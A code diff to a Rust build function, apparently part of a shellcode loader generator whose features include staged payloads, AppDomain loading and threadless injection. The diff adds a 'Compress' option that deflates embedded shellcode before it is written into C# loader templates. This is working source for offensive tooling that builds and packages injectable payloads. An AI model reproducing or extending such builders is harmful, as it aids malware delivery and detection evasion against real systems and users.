@@ -152,6 +152,7 @@ fn run_build(
             "Staged"           => Some(Feature::Staged),
             "AppDomain"        => Some(Feature::AppDomain),
             "ThreadlessInject" => Some(Feature::ThreadlessInject),
+            "Compress"         => Some(Feature::Compress),
             _                  => None,
         }).collect();
 
@@ -168,11 +169,39 @@ fn run_build(
         !s.is_empty() && s.len() % 2 == 0 && s.bytes().all(|b| b.is_ascii_hexdigit())
     }
 
-    let sc_hex  = req.shellcode_hex.replace(' ', "");
+    let mut sc_hex  = req.shellcode_hex.replace(' ', "");
     let key_hex = req.key_hex.replace(' ', "");
     let iv_hex  = req.iv_hex.replace(' ', "");
 
     let is_staged_mode = req.staged.is_some();
+
+    // If Compress feature requested AND payload is embedded (not staged),
+    // raw-deflate the shellcode bytes here. The C# templates' decompression
+    // branch (`{% if is_compressed %}`) wraps the runtime decode. Staged
+    // payloads stay raw on the server because the loader pulls them as-is.
+    if !is_staged_mode && features.iter().any(|f| matches!(f, Feature::Compress)) {
+        if let Ok(raw) = (0..sc_hex.len()).step_by(2)
+            .map(|i| u8::from_str_radix(&sc_hex[i..i+2], 16))
+            .collect::<Result<Vec<u8>, _>>()
+        {
+            use flate2::write::DeflateEncoder;
+            use flate2::Compression;
+            use std::io::Write;
+            let mut enc = DeflateEncoder::new(Vec::with_capacity(raw.len()), Compression::best());
+            if enc.write_all(&raw).is_ok() {
+                if let Ok(compressed) = enc.finish() {
+                    let before = raw.len();
+                    let after  = compressed.len();
+                    tracing::info!(
+                        "Compress: shellcode {} → {} bytes ({:+}%)",
+                        before, after,
+                        ((after as isize - before as isize) * 100 / before as isize)
+                    );
+                    sc_hex = compressed.iter().map(|b| format!("{:02x}", b)).collect();
+                }
+            }
+        }
+    }
 
     // In staged mode, shellcode_hex can be empty — the loader fetches at runtime.
     if !is_staged_mode {
